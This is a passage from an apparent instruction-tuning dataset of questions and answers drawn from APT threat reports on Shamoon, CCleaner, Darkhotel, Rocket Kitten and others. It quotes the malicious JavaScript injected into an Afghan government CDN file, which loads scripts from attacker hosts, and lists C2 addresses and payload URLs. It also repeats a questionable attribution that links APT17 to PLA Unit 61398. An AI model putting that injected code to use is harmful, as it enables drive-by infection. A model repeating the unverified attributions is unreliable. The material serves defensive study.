    "output": "Shamoon/Disttrack malware consists of three components: a dropper, a wiper, and a reporter module. The dropper component creates all the required files on the system, registers a service called 'TrkSvr' to start itself with Windows, and attempts to copy itself to accessible network shares and execute itself remotely if successfully copied. The wiper component is activated when a hardcoded configuration date has been passed, enabling a coordinated 'time bomb' scenario. It drops a legitimate and digitally signed device driver that provides low-level disk access from user space, collects file names, and starts overwriting them with a JPEG image or 192KB blocks of random data. Finally, it wipes the master boot record with the same data. The reporter component sends back a HTTP GET request to the C&C server, reporting the domain name, IP address, and number of files overwritten. The attackers acquired user credentials and gained access to the domain controller to push the malware onto many systems before triggering the destructive payload.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Afghan Government \"Watering Hole\"\nThe (<http://www.threatconnect.com/why_threat_connect/threatconnect_intelligence_research_team>)ThreatConnect Intelligence Research Team (TCIRT) recently observed a targeted cross-site scripting (XSS) \"drive-by\" attack that leveraged a single content delivery network resource to distribute a malicious Java applet via nearly all of the major official Government of Afghanistan websites. The compromised CDN resource in question is a JavaScript file hosted at [http:]//cdn.afghanistan[.]af/scripts/gop-script.js\nThe domain cdn.afghanistan[.]af is a legitimate CDN site used by the Afghan Ministry of Communications and IT (MCIT) to host web content that is displayed and used on many official gov.af websites.\nThe javascript URL ([http:]//cdn.afghanistan[.]af/scripts/gop-script.js) is called from numerous official Afghan Government websites, including the following:\n[http:]//canberra.afghanistan[.]af/en (Afghan Embassy in Canberra, Australia)\n[http:]//herat.gov[.]af/fa (Herat Province Regional Government)\n[http:]//mfa.gov[.]af/en (Ministry of Foreign Affairs)\n[http:]//moci.gov[.]af/en (Ministry of Commerce and Industries)\n[http:]//moe.gov[.]af/en (Ministry of Education)\n[http:]//mof.gov[.]af/en (Ministry of Finance)\n[http:]//moj.gov[.]af/fa (Ministry of Justice)\n[http:]//mowa.gov[.]af/fa (Ministry of Women's Affairs)\n[http:]//oaacoms.gov[.]af/fa (Office of Administrative Affairs and Council of Ministers)\nIt is likely that this javascript URL itself is normally legitimate, but the attackers obtained access to the file and prepended the following malicious JavaScript functions to the beginning of the script:\ndocument.write(\"<script src=http://update.javaplug-in.com/o/j.js><\\/script>\"); document.write(\"<script src=http:\\/\\/neoting.com/pay/danal/PhoneBill/07/1.js> <\\/script>\");\nNote that the gov.af websites would not need to be compromised individually for this attack to be delivered to visitors of the sites, because it is the backend CDN infrastructure that is serving up the malicious script.\nBig Headline: Li Keqiang: A Harbinger of Targeted Exploitation?\nJudging by the last modified timestamp on the HTTP response of gop-script.js, which is Tue, 16 Dec 2014 08:07:06 GMT, this malicious CDN compromise was very recent in nature. In fact, it occurred on the very same day that China's Prime Minister Li Keqiang would (<http://www.china-embassy.org/eng/zgyw/t1220079.htm>)meet with Abdullah Abdullah, the Chief Executive Officer of Afghanistan in Astana Kazakhstan, they would discuss infrastructure development and bilateral cooperation issues.\nLooking at the EXIF metadata of the image of Keqiang meeting with Abdullah that is hosted on the Chinese embassy website we note a Tue, 16 December 2014 07:43:31 modify time as well as the www.news[.]cn watermark in the bottom righthand corner. This indicates that the image of Keqiang and Abdullah was likely taken and edited sometime prior to 07:43:31. While it is ambiguous as to which timezone the edits actually took place in (Kazakhstan or China) we assume the date timestamp references GMT because the press release states \"In the afternoon of December 15 local time\u2026\" If we assume the photograph and afternoon meeting took place sometime prior to 13:43 Alma-Ata standard time (+0600) this would closely correspond with a 07:43 GMT time stamp. The modification of the gop-script.js by the attackers at 08:07:06 GMT likely tracks extremely close to a window of a few hours in which Keqiang met with Abdullah.\nIt is worth mentioning that a similar scenario occurred on June 20th when security researcher (<https://twitter.com/PhysicalDrive0/status/479921770838102017>)PhysicalDrive0 observed a malicious Java file hosted on the Embassy of Greece in Beijing. At the time, a Chinese delegation led by (<https://twitter.com/ThreatConnect/status/480070196011737088>)Keqiang was (<http://www.ibtimes.co.uk/why-greece-rolling-out-red-carpet-li-keqiangs-chinese-investment-1453397>)visiting Greek Prime Minister Antonis Samaras in Athens. Security researcher (<https://twitter.com/TheEnergyStory>)R136a1 aka \"thegoldenmessenger\" released a followup blog with detailed (<http://thegoldenmessenger.blogspot.de/2014/06/blitzanalysis-embassy-of-greece-beijing.html>)analysis of the Greek embassy compromise.\nWhile these two separate events are not directly related, additional research into the status of ministerial and official government websites on or around the dates of notable Chinese delegations and or bilateral meetings may yield additional patterns of interest.\nBig Headline: Java Malware Overlap\nUpon closer inspection of the prepended malicious JavaScript code, one will notice the similarity in the update.javaplug-in[.]com naming convention and URL structure to the C2 domain java-se[.]com found in the Palo Alto Networks blog post (<http://researchcenter.paloaltonetworks.com/2014/08/attacks-east-asia-using-google-code-command-control/>)Attacks on East Asia using Google Code for Command and Control and associated with (<https://www.fireeye.com/blog/threat-research/2014/08/operation-poisoned-hurricane.html>)Operation Poisoned Hurricane. However, the malicious document.write driveby URLs listed above both result in 403 Forbidden errors as of December 18, 2014.\nWhile the 403 Forbidden errors may seem like an analytic dead end, the TCIRT also identified a malicious Java applet submission to VirusTotal that confirms the nature of this malicious activity. This Java applet, SHA1: (<https://www.virustotal.com/en/file/4cc859f16cfb51f7cf5d4f24f6a371f321722fbd8a0a45c62c0fac5ac89b86bd/analysis/>)388E6F41462774268491D1F121F333618C6A2C9A, has no antivirus detections as of December 21st. The applet contains its malicious class file at the path \"jre7u61windows/x86/Update.class\". This class file downloads and decodes an XOR 0xC8 encoded Windows PE executable payload from [http:]//mfa.gov[.]af/content/images/icon35.png, hosted on the official Afghan Ministry of Foreign Affairs site, which was also affected by the gop-script XSS.\nUsing historic context archived within ThreatConnect, the TCIRT concluded that this Java applet is from the same source code as the applet SHA1: (<https://www.virustotal.com/en/file/3f88dd9f5a93270d94ff40410b050a8e7061b937d7110f13e2132eee18e75991/analysis/>)ADC162DD909283097E72FC50B7AB0E04AB8A2BCC, which was previously observed by the TCIRT at the Operation Poisoned Hurricane related URL [http:]//jre7.java-se[.]com/java.jar on August 15, 2014. This applet has the same class path, and downloads an XOR 0xFF encoded payload executable from the URL [https:]//amco-triton.co[.]jp/js/dl/in.jpg. Additional indicators and context associated with this particular Java driveby (<https://app.threatconnect.com/tc/auth/incident/incident.xhtml?incident=130728>)activity can be found in the ThreatConnect Common Community Incident 20140815A: java-se APT Driveby (shared October 02, 2014)\nBig Headline: The Windows PE Payload\nThe XOR 0xC8 encoded payload downloaded from [http:]//mfa.gov[.]af/content/images/icon35.png decodes into the Windows PE executable SHA1: 72D72DC1BBA4C5EBC3D6E02F7B446114A3C58EAB\nThis executable is a self-extracting (SFX) Microsoft Cabinet executable that is digitally signed with a valid certificate from \"OnAndOn Information System Co., Ltd.\", serial number \"1F F7 D8 64 18 1C 55 5E 70 CF DD 3A 59 34 C4 7D\". This same certificate was also used to sign the Java applet that downloaded this malware.\nThis executable drops the following files:\nSHA1: 2068260601D60F07829EE0CEDF5A9C636CDB1765 (dllhost.exe)\nLegitimate Microsoft Debugging Tools for Windows Executable, loads dbgeng.dll\nSHA1: E2D93ABC4C5EDE41CAF1C0D751A329B884D732A2 (dbgeng.dll)\nMalicious DLL that loads into the above dllhost.exe, using a similar (<http://www.rsaconference.com/writable/presentations/file_upload/hta-w04a-dll-side-loading-a-thorn-in-the-side-of-the-anti-virus-_av_-industry.pdf>)DLL sideloading technique to that most commonly associated with the PlugX backdoor.\nSHA1: 5C8683E3523C7FA81A0166D7D127616B06334E8D (Readme.txt)\nMalicious encrypted backdoor binary blob loaded by dbgeng.dll\nThis backdoor connects to the faux Oracle Java themed command and control (C2) domain oracle0876634.javaplug-in[.]com. Note that javaplug-in[.]com is the same root domain found in the compromised version of [http:]//cdn.afghanistan[.]af/scripts/gop-script.js as [http:]//update.javaplug-in[.]com/o/j.js, confirming that this Java malware is in fact directly associated with the Afghan MCIT CDN XSS compromise.\nFull indicators of this activity and a YARA rule to detect the malware certificate can be found in the ThreatConnect Common Community under Incident (<https://app.threatconnect.com/tc/auth/incident/incident.xhtml?incident=170659>)20141217A: Afghan Government Java Driveby and signature (<https://app.threatconnect.com/tc/auth/signature/signature.xhtml?signature=170665>)APT_OnAndOn_cert.yara.\n\nWhat is the significance of the timing of the CDN compromise in relation to the meeting between China's Prime Minister Li Keqiang and Abdullah Abdullah, the Chief Executive Officer of Afghanistan? How does this timing suggest potential motives or targets of the attack?",
    "output": "A: The CDN compromise occurred on the same day as the meeting between Li Keqiang and Abdullah Abdullah, with the malicious script being modified at 08:07:06 GMT, closely aligning with the meeting's timeline. This timing suggests that the attack may have been strategically planned to coincide with the high-profile meeting, potentially aiming to gather intelligence or disrupt communications related to the bilateral talks. The proximity of the attack to the meeting indicates that the attackers might have been targeting individuals or entities involved in the discussions.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nMedium Headline: Mr. Tekide on the Internet\nMr. Tekide maintains a visible profile across various malware related web forums, as well as on social media. Searches conducted for this alias provided numerous results which reveal a consistent use of the Mr. Tekide name and avatar, as shown in the images below.\nFigure 40: Mr.Tekide's administrator profile on the crypter[.]ir forums Figure 41: PAC Crypt page on the crypter[.]ir online shop\nA link found on the 'Contact' page of the crypter[.]ir website led to a (<https://www.facebook.com/tekide>)Facebook profile in the name of 'Pezhman Blackhat.' In addition to this Facebook profile, we also identified a (<https://ir.linkedin.com/in/pezhman-tekide-a87054bb>)LinkedIn profile in which he refers to himself as a 'crypter,' and states (<https://www.instagram.com/tekide/>)that he works for the ashiyane digital security team. He also maintains an Instagram profile.\nBig Headline: Appendix F: Notification\nOn April 12, 2016 we contacted Hetzner via e-mail as well as their abuse form, and informed them that the server was being used to host malware. We also provided network logs as well as a malware sample. We subsequently followed up with two phone calls. On a telephone call, a Hetzner representative refused to investigate, stating that they would take no investigative action before sharing the content of our complaint with the customer, who would then have 24 hours to take action. When we suggested that this might result in the deletion of evidence, and highlighted the special nature of the case, the representative refused any further action.\nFootnotes1 Noura has given her permission for us to disclose her role in this case, and use her photograph.\n2 Mozilla/5.0 (Windows NT 6.3; rv:39.0) Gecko/20100101 Firefox/39.0\n3 http://ashiyane[.]org/forums\n4 This technique has been (<http://phishme.com/powerpoint-and-custom-actions/>)documented previously.\n\nHow does Mr. Tekide maintain his online presence and what are the implications of his activities on cybersecurity?",
    "output": "Mr. Tekide maintains a visible profile across various malware-related web forums and social media platforms. He consistently uses the alias 'Mr. Tekide' and a specific avatar. His online presence includes an administrator profile on the crypter[.]ir forums, a Facebook profile under the name 'Pezhman Blackhat', a LinkedIn profile where he identifies himself as a 'crypter' working for the Ashiyane Digital Security Team, and an Instagram profile. These activities indicate that Mr. Tekide is actively involved in the malware community, potentially developing and distributing malicious software. His involvement poses significant cybersecurity risks, as it suggests he may be contributing to the creation and dissemination of harmful tools that could be used for surveillance, data theft, or other malicious purposes.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How do Advanced Persistent Threats (APTs) like the Syrian Electronic Army (SEA) use Trojan Horses to compromise their targets, and what are the implications of such attacks?",
    "output": "A Trojan Horse is a type of malware that appears to be benign or useful but actually contains hidden code that violates the intended security policy of the user or system administrator. In the context of APTs like the SEA, Trojan Horses are often used to compromise targets through socially engineered spear-phishing emails. These emails lure opposition activists into opening fraudulent, weaponized, and malicious documents that install remote access tool (RAT) software on the victim's computer. This software can give the attacker keystrokes, screenshots, microphone and webcam recordings, stolen documents, and passwords, which are then sent to a computer address controlled by the SEA for intelligence collection and review. The implications of such attacks are significant, as they can give the attackers access to sensitive information and allow them to target political activists for espionage, intimidation, and arrest. Furthermore, the use of Trojan Horses by APTs like the SEA highlights the importance of robust cybersecurity measures, including employee education and awareness, to prevent such attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What types of tools did the CARBANAK attackers use in their toolset, and how did they manage to evade detection by antivirus vendors?",
    "output": "The CARBANAK attackers used a mix of custom tools, freely available code, and open source software utilities in their toolset. RSA IR researched all 32 of the malicious files in the CARBANAK toolset using various publicly available and open source resources. Six of these tools were found to have been uploaded to a publicly available antivirus aggregation site, with five of them having little to no detection or indication of malice from antivirus vendors. This lack of detection explains why the client's signature-based host protection mechanisms were unable to identify or prevent the use of these tools.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: The Big Connection:\nCostin Raiu, director of Global Research and Analysis Team at Kaspersky Lab, was the first to find a code connection between APT17 and the backdoor in the infected CCleaner:\nThe malware injected into (<https://twitter.com/hashtag/CCleaner?src=hash&ref_src=twsrc%5Etfw>)#CCleaner has shared code with several tools used by one of the APT groups from the (<https://twitter.com/hashtag/Axiom?src=hash&ref_src=twsrc%5Etfw>)#Axiom APT 'umbrella'.\nUsing (<http://www.intezer.com/intezer-analyze/>)Intezer Analyze\u2122, we were able to verify the shared code between the backdoor implanted in CCleaner and earlier APT17 samples. The photo below is the result of uploading the CCBkdr module to (<http://www.intezer.com/intezer-analyze/>)Intezer Analyze\u2122, where the results show there is an overlap in code. With our technology, we can compare code to a huge database of malicious and trusted software \u2014 that's how we can prove that this code has never been seen before in any other software.\nA deeper analysis leads us to the functions shown below. The code in question is a unique implementation of base64 only previously seen in APT17 and not in any public repository, which makes a strong case about attribution to the same threat actor.\nThis code connection is huge news. APT17, also known as Operation Aurora, is one of the most sophisticated cyber attacks ever conducted and they specialize in supply chain attacks. In this case, they probably were able to hack CCleaner's build server in order to plant this malware. Operation Aurora started in 2009 and to see the same threat actor still active in 2017 could possibly mean there are many other supply chain attacks by the same group that we are not aware of. The previous attacks are attributed to a Chinese group called PLA Unit 61398.\nBig Headline: Technical Analysis:\nThe infected CCleaner file that begins the analysis is from 6f7840c77f99049d788155c1351e1560b62b8ad18ad0e9adda8218b9f432f0a9\nThe flow-graph of the malicious CCleaner is as follows (taken from the Talos report):\nInfected function:\nLoad and execute the payload code:\nAfter the embedded code is decrypted and executed, the next step is a PE (portable executable) file loader. A PE file loader basically emulates the process of what happens when you load an executable file on Windows. Data is read\nfrom the PE header, from a module created by the malware author.\nThe PE loader first begins by resolving the addresses of imports commonly used by loaders and calling them. GetProcAddress to get the addresses of external necessary functions, LoadLibraryA to load necessary modules into memory and get the address of the location of the module in memory, VirtualAlloc to create memory for somewhere to copy the memory, and in some cases, when not implemented, and memcpy to copy the buffer to the newly allocated memory region.\nAfter the module is copied to memory, to load it properly, the proper loading procedure is executed. The relocation table is read to adjust the module to the base address of the allocated memory region, the import table is read, the necessary libraries are loaded, and the import address table is filled with the correct addresses of the imports. Next,\nthe entire PE header is overwritten with 0's, a mechanism to destroy the PE header tricking security software into not realizing this module is malicious, and after the malicious code begins execution.\nThe main module does the following:\n1. Tries an anti-debug technique using time and IcmpSendEcho to wait\n2. Collect data about the computer (Operating system, computer name, DNS domain, running processes, e tc)\n3. Allocates memory for payload to retrieve from C&C server\n4. Contacts C&C server at IP address 216.126.225.148\na. If this IP address is unreachable, uses a domain generation algorithm and uses a different domain depending on the month and year\n5. Executes code sent by C&C\nBy the time of the analysis, we were unable to get our hands on the code sent by the C&Cs.\nIf you would like to analyze the malware yourself, you may refer to my tweet.\n\u2014 Jay Rosenberg (@jaytezer) (<https://twitter.com/jaytezer/status/909807005266825216?ref_src=twsrc%5Etfw>)September 18, 2017\n\nWhat steps does the malicious CCleaner module take to load and execute its payload? How does it evade detection by security software?",
    "output": "The malicious CCleaner module takes several steps to load and execute its payload. First, it decrypts and executes the embedded code. Then, it uses a PE (portable executable) file loader to emulate the process of loading an executable file on Windows. This involves resolving the addresses of common imports like GetProcAddress, LoadLibraryA, VirtualAlloc, and memcpy. After copying the module to memory, it reads the relocation table to adjust the module to the base address, loads necessary libraries, and fills the import address table with the correct addresses. To evade detection, the module overwrites the entire PE header with zeros, tricking security software into not recognizing the module as malicious. Additionally, the main module performs anti-debug techniques using time and IcmpSendEcho, collects data about the computer, allocates memory for the payload retrieved from the C&C server, contacts the C&C server, and executes the code sent by the C&C.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Starting point\nWhile the image is a valid Bitmap and can actually be displayed, it may be something more than a simple Bitmap.\nWe have seen pieces of malware appending data at the end of legitimate/innofensive files being retrieved. For example, VinSelf itself sends encrypted data to its C&C prepended by a \"GIF89a\" header. (<http://www.cyberesi.com/2011/08/31/trojan-foxy/>)Foxy also receives encrypted commands from its C&C in what seems a legitimate JPEG image, and (<http://www.symantec.com/connect/blogs/truth-behind-shady-rat>)Shady RAT is concealing commands in encrypted HTML commentaries, or inside images using real steganography.\nLet's look at the code following the retrieval of this file from Google Docs if there's something interesting.\nBig Headline: Steganography\nThe function following the retrieval of the \"colors.bmp\" file is quite interesting.\nAs you can see, it is scanning the image pixel per pixel. The outermost loop is incrementing the row counter, the next one is incrementing the column counter while the innermost one is a loop among the three primary colors.\nThe function is grabbing the LSB (Least Significant Bit) of each color of each pixel, thus generating three bits of data per pixel of the image. Once all those LSBs have been grabbed, each byte of the bitstream is reversed.\nBig Headline: Unciphering\nNow that we have extracted the hidden data, it must be unciphered: this is done in four steps:\nthe first step is the use of the VinSelf custom obfuscation algorithm with an hard-coded key in the binary;\nthe second step is another use of the VinSelf custom obfuscation algorithm with the key decoded at the previous step on the next 32 bytes of the data;\nthe third step is a decryption algorithm that was, at first, unknown to us. Thanks to the specific bitwise manipulations employed by this code (shifts and rotations) and to the quick and efficient research of our cryptoteam, it was successfully identified as (<http://www.ecrypt.eu.org/stream/p3ciphers/hc/hc128_p3.pdf>)HC-128, a stream cipher that is not used that much;\nfinally, the fourth and last step is once again the use of the VinSelf custom obfuscation algorithm with the key used in the second step on the HC-128 decrypted data.\nBig Headline: End point\nUltimately we end up with a C&C configuration that looks like:\n192.168.1.101:2.2.2.2:3.3.3.3:4.4.4.4\nAs a matter of fact, we changed the real content in the source image to not disclose the real C&C.\nSo instead of having just one layer of obfuscation (the custom VinSelf algorithm), we end up with several layers:\nthe custom VinSelf algorithm encrypting the Google Docs URL;\nan LSB-extraction steganography;\ntwo instances of the VinSelf algorithm;\nan HC-128 encryption;\na final VinSelf encryption.\nSteganography is not just for hipsters, it is still being used nowadays.\n\nDescribe the multi-layered obfuscation and encryption process used by VinSelf after extracting hidden data from the 'colors.bmp' file. What specific algorithms are employed, and how are they applied sequentially?",
    "output": "After extracting the hidden data from the 'colors.bmp' file, VinSelf employs a multi-layered obfuscation and encryption process. First, the VinSelf custom obfuscation algorithm is applied with a hard-coded key. Second, the same algorithm is used again with a key decoded from the previous step on the next 32 bytes of data. Third, the HC-128 stream cipher is applied for decryption, which is identified through specific bitwise manipulations. Finally, the VinSelf custom obfuscation algorithm is applied once more with the key used in the second step on the HC-128 decrypted data. This layered approach ensures robust protection of the C&C configuration.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: Prevent back door communications\nBlock access to the following command-and-control server IP addresses that are associated with this attack.\nAny technical information that is made available by Symantec Corporation is the copyrighted work of Symantec Corporation and is owned by Symantec Corporation.\nNO WARRANTY . The technical information is being delivered to you as is and Symantec Corporation makes no warranty as to its accuracy or use. Any use of the technical documentation or the information contained herein is at the risk of the user. Documentation may include technical or other inaccuracies or typographical errors. Symantec reserves the right to make changes without prior notice.\nVery Small Headline: About Symantec\nSymantec is a global leader in providing security, storage and systems management solutions to help businesses and consumers secure and manage their information. Headquartered in Moutain View, Calif., Symantec has operations in more than 40 countries. More information is available at www.symantec.com.\nFor specific country offices and contact numbers, please visit our Web site. For product information in the U.S., call toll-free 1 (800) 745 6054.\nSymantec Corporation World Headquarters\n350 Ellis Street Mountain View, CA 94043 USA\n+1 (650) 527-8000\nwww.symantec.com\nCopyright \u00a9 2012 Symantec Corporation. All rights reserved. Symantec and the Symantec logo are trademarks or registered trademarks of Symantec Corporation or its affiliates in the U.S. and other countries. Other names may be trademarks of their respective owners.\n\nWhy is it crucial to block access to specific command-and-control (C&C) server IP addresses associated with the Taidoor attack? Explain how this mitigation strategy works and its importance in preventing further damage.",
    "output": "Blocking access to specific C&C server IP addresses associated with the Taidoor attack is crucial because it disrupts the communication between the compromised systems and the attackers' servers. By blocking these IP addresses, organizations can prevent the backdoor Trojan from receiving commands or exfiltrating data. This mitigation strategy effectively severs the control channel that the attackers use to remotely access and manipulate infected systems. Without this communication link, the attackers lose their ability to execute further malicious activities, such as stealing sensitive information or spreading the infection to other parts of the network. Therefore, this measure is essential for containing the impact of the Taidoor attack and protecting the integrity and confidentiality of the organization's data.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Keylogger\nKeylogger stores keystrokes to the following file:\n%TEMP%\\log%d.txt\nHere is a sample of malware key-log output:\n(((((((Hello new File)))))))))\n+++++++++++++\nWindow= VMware Accelerated AMD PCNet Adapter (Microsoft's Packet Scheduler) : Capturing - Wireshark\n+++++++++++++\n[UP][DOWN][DOWN][UP][UP][DOWN][UP][DOWN][DOWN][UP][UP][DOWN][DOWN][DOWN][UP][UP][UP][UP] [DOWN][DOWN][DOWN][DOWN]r\n+++++++++++++\nWindow= Run\n+++++++++++++\ncmd[ENTER]\n+++++++++++++\nWindow= C:\\WINDOWS\\system32\\cmd.exe\n+++++++++++++\nnotepad[ENTER]\n+++++++++++++\nWindow= VMware Accelerated AMD PCNet Adapter (Microsoft's Packet Scheduler) : Capturing - Wireshark\n+++++++++++++\n[DOWN][UP]\n+++++++++++++\nWindow= Untitled - Notepad\n+++++++++++++\ntest test test\n+++++++++++++\nThis file will be sent to remote C&C server later on.\nIf the malware detects an open \"Gmail\", \"Yahoo\" or \"Outlook\" window, it will add special processing so the attacker can easily recognize the data that is the most valuable to him. The following string will be appended to the output file:\n\\r/////////////\\r\\nMail Find\nMedium Headline: Traffic Monitoring\nThe malware may sniff all TCP and UDP traffic on the machine. This is achieved through the use of RAW sockets. The following status strings can be sent to the C&C server:\nInitializing Winsock 2.2...\nCreating RAW socket...\nConfiguring socket for packet interception\nStarting the sniffing process...\nUDP Packet Information:\nSource IP: %s DESTINATION IP: %s\nSOURCE PORT: %d DESTINATION PORT: %d\nPACKET DATA:\n#############################################################\nTCP Packet Information:\nSource IP: %s DESTINATION IP: %s\nSOURCE PORT: %d DESTINATION PORT: %d\n#############################################################\nIf the current user privileges are insufficient for such action, the following error is presented:\nthe processs is not admin try after restart to while mpkProcess To Admin...\nMedium Headline: File Exfiltration\nThe malware may exfiltrate any file to the remote C&C server. The malware also contains the ability to enumerate all files on the system or find a specific file with the required filename specified by the operator.\nUpon file exfiltration, the file is checked for size. This is performed in order to send the file in 4Kb 'chunks', where each chunk frame is sized 0x1014h bytes.\nBefore uploading any file to the C&C server, the malware will report its size:\nAfter sending each chunk, the malware will report the current transfer status:\n%d Bytes / %d Bytes\nWhen the transfer will be finished, it will report completion using the following string:\nCompleted: %d Bytes Downloaded.\nIf there was any problem, this string will be reported:\nFailed to open %s, %s not found.\nSmall Headline: 123456\nFile-exfiltration packets are 0x1014h bytes long. The first 2 bytes indicate the type of file to be exfiltrated:\n\u2022 0811h\u2014logs (initial packet)\n\u2022 0810h\u2014logs (subsequent packets)\n\u2022 080Fh\u2014logs (final packet)\n\u2022 0BCDh\u2014webcam images (initial packet)\n\u2022 0BCFh\u2014webcam images (subsequent packets)\n\u2022 0BCEh\u2014webcam images (final packet)\n\u2022 0803h\u2014screenshots (initial packet)\n\u2022 0805h\u2014screenshots (subsequent packets)\n\u2022 0804h\u2014screenshots (final packet)\n\u2022 13C2h\u2014error with file\nThe filename is located at offset 0x08h of the first packet. Subsequent packets include file contents only.\nThe Check Point Incident Response Team is available to investigate and resolve complex security events that span from malware events, intrusions or denial of service attacks.\nThe team is available 24x7x365 by contacting emergency-response@checkpoint.com or calling 866-923-0907\n\u00a92015 Check Point Software Technologies Ltd. All rights reserved.\n\nQ: Explain the process by which the Rocket Kitten malware performs traffic monitoring and how it handles insufficient user privileges.",
    "output": "A: The Rocket Kitten malware can sniff all TCP and UDP traffic on the infected machine using RAW sockets. It sends status strings to the C&C server indicating the initialization and progress of the sniffing process, such as 'Initializing Winsock 2.2...', 'Creating RAW socket...', and 'Starting the sniffing process...'. If the user privileges are insufficient for creating RAW sockets, the malware presents an error message: 'the processs is not admin try after restart to while mpkProcess To Admin...'. This indicates that the malware requires administrative privileges to perform traffic monitoring effectively.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Selective Infector\nThis component is a virus, and is used to selectively infiltrate into other computers via USB or network shares.\nFirst, the virus retrieves all available disks and starting from disk number 4 (D:\\) to disk number 20 (Z:\\), finds executable files and infects them. The code simply brute forces the list of mapped removable drives.\nDuring its infection routine, the infector changes the entrypoint of executable files, creates an .rdat section, and inserts a small loader in the section, then puts its main payload in the overlay. Every infected file has functionality described in Trojan-Dropper & Injector section, so it can collect information about the computer, send it to the C2 and download other Darkhotel components as commanded. Observed downloaded components are signed with a familiar expired certificate from , issued by Cybertrust SureServer CA.\nAgain, further technical details are provided in Appendix D.\nMedium Headline: Campaign Codes\nAlmost every backdoor in this set maintains an internal campaign code or id, used in initial c2 communications as described above. Some IDs appear to be related to geographic interests, others do not seem obvious. We gathered a list of Darkhotel campaign IDs shown below. Internal IDs and c2 resources overlap across these components, there is no pattern of distribution according to connectback resources. The most common id is \"DEXT87\":\nDEXT87\nstep2-auto\ndome1-auto\nstep2-down\nJava5.22\nC@RNUL-auto\ndome-down\nM1Q84K3H\nNKEX#V1.Q-auto\nNKstep2-auto\nPANA(AMB)-auto\nPANA#MERA\nSOYA#2-auto\nstep2-down-u\n(ULT)\nVER1.5.1\nVICTORY\nWINM#V1.Q\nBig Headline: Infrastructure and Victims\nThis infrastructure team appears to employ a lesser skillset than top notch campaigns, maintaining weak server configurations with limited monitoring and defensive reactions, and making some simple mistakes. However, they are effective at maintaining a fully available infrastructure to support new and existing infections.\nOverall, victims in our sinkhole logs and KSN data were found across the globe, with the majority in Japan, Taiwan, China, Russia, Korea and Hong Kong.\nSmall Headline: Sinkhole Data\nBecause the operators very actively build up new command and control servers, it is difficult to sinkhole enough domains to get an accurate overall picture of victim system location based on this data. Also, many researcher systems are connected to the sinkholed domains. However, this graph of current sinkhole callbacks presents a low confidence distribution of victim geolocation, with India, Japan, Ireland, Korea, China and Taiwan in the top slots. Removing India and Ireland, the set more closely matches our KSN data.\nMedium Headline: Available ddrlog Victim Data\nMany of these c2s maintain a common directory path that serves a ddrlog. The ddrlogs appear to maintain callback data that the attackers want to set aside in error logs. Many of the callback URLs have errors, many are from unwanted IP ranges, and others are clearly unwanted researcher sandbox system callbacks.\nA description of the detailed connectback URL values and their xor/base64 encoding scheme is included in the \"Interesting Malware Trojan.Win32.Karba.e\" technical notes in Appendix D.\nThe Darkhotel c2 maintain these directory structures to store and serve ddrlog content:\n\u2022 /bin/error/ddrlog\n\u2022 /patch/error/ddrlog\nThe following structures appear to be common across servers, but do not produce ddrlog and do not maintain an /error/ directory:\n\u2022 /u2/\n\u2022 /u3/\n\u2022 /patch2/\n\u2022 /major/\n\u2022 inor/\n\u2022 /asp/\n\u2022 /update3/\nTwo ddrlog files report entries starting January 1, 2009 at 9:16 a.m.\n\u2022 autozone.000space.com\n\u2022 genuinsman.phpnet.us\nAll of the logs maintain a significant number of entries, almost 50,000, with a simple stamp \"B\" or \"L\". Those records are formatted in the following manner:\nOnly 120 IP addresses perform the \"B\" checkin, and 90% of these are from the range 150.70.97.x. This entire range is owned by Trend Micro in Tokyo, JP.\nA handful of the remaining addresses, like 222.150.70.228, appear to come from other ranges owned by Trend Micro in JP. One outlier comes from an El Salvadoran ISP, and another is connected to a Japanese ISP. Approximately 20,000 IP addresses perform the \"L\" checkin.\nOther ddrlogs may include \"A\" tags as well.\nThe \"A\" tag labels unwanted checkins from untargeted locations, like Hungary and Italy. The \"B\" tag labels unwanted checkins from Trend Micro IP ranges.\nThe \"L\" tag labels unwanted checkins from a variety of ranges, but includes odd IP like the loopback address, 127.0.0.1, clearly an error.\nEntries in these logs include callback URLs that have spaces and unusual characters that do not conform to the required base64 character dictionary.\nMedium Headline: C2 Communications and Structure\nTypical main page:\nFor begatrendstone.com, we have the following directory structure:\n/bin\n- read_i.php (main C&C script)\n- login.php (unknown, replies \"Wrong ID()\")\n/bin/error (error logs stored here)\n- ddrlog\n/bin/tmp\n/bin/SElhxxwiN3pxxiAPxxc9\n- all.gif\n/i\n- encrypted stolen victim system content\n/L /f For auto2116.phpnet.us, we have the following directory structure:\n/patch\n- chkupdate.php (main command and control script)\n/patch/error\n- ddrlog\nThe group encrypts victim data on their servers with single user/passkey combinations across multiple victims. When an unauthorized user attempts to access a Darkhotel web interface for victim management without the correct passkey, the html page and table layout renders properly, but all the data values on the page are returned as garbled ciphertext.\nMedium Headline: Victim Management\nNew victim systems appear to be systematically vetted. The attackers maintain a web interface to vet these new victim systems. The attackers first and foremost list and sort victim systems according to their latest c2 check-in. Collected data probably is presented in order of importance:\n1. user's logon name\n2. system CPU and OS\n3. \"Ping sec\", or how far the victim system is from the c2\n4. \"In\", or the process that the attackers' dll code executes within\n5. Vac: Antivirus Product identifier\n6. system LAN IP\n7. network WAN IP\nHere is an example of one of these web pages:\nSmall Headline: Researcher Activity\nClearly, some automated analysis activity involving researchers' sandbox tools are filling up these logs. From June 2013 to April 2014 (approximately an 11 month period), in only 15 ddrlog files, we observe almost 7,000 connections from research sandbox systems. The network connections provide a1= through a3= values identifying a QEMU based sandbox, all sourced from only 485 WAN IP addresses. Under 30 lan IPs are recorded, all in the same 172.16.2.14-126 range. This system(s) uses a \"Dave\" user account and \"HOME-OFF-D5F0AC\" Windows system name.\nThese characteristics correspond with network activity generated by GFI Software's \"CWsandbox\" 